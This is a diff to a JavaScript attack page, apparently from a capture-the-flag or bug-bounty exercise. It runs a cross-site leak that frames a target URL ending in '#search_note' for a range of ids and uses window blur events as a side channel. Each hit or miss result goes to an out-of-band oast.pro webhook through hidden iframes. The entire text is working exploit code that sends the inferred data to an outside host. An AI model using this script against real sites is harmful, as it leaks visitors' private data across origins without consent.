@@ -5,24 +5,27 @@ const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
 const urlParams = new URLSearchParams(window.location.search);
 const startId = parseInt(urlParams.get('id'), 10) || 1;
 
-window.onload = function () {
-    for (let i = 0; i < 100; i++) {
-        const id = startId + i;
+function testId(id) {
+    return new Promise((resolve) => {
         let blurFired = false;
-
         window.addEventListener("blur", () => { blurFired = true; });
-
         const iframe = document.createElement("iframe");
         iframe.src = TARGET + id + "#search_note";
         document.body.appendChild(iframe);
-
         setTimeout(() => {
             const result = blurFired ? "hit" : "miss";
             const ex = document.createElement("iframe");
             ex.style.display = "none";
             ex.src = WEBHOOK + "?result=" + result + "&id=" + id;
             document.body.appendChild(ex);
-        }, 10000);
+            resolve();
+        }, 1000);
+    });
+}
+
+window.onload = async function() {
+    for (let i = 0; i < 100; i++) {
+        await testId(startId + i);
     }
 };
 </script>
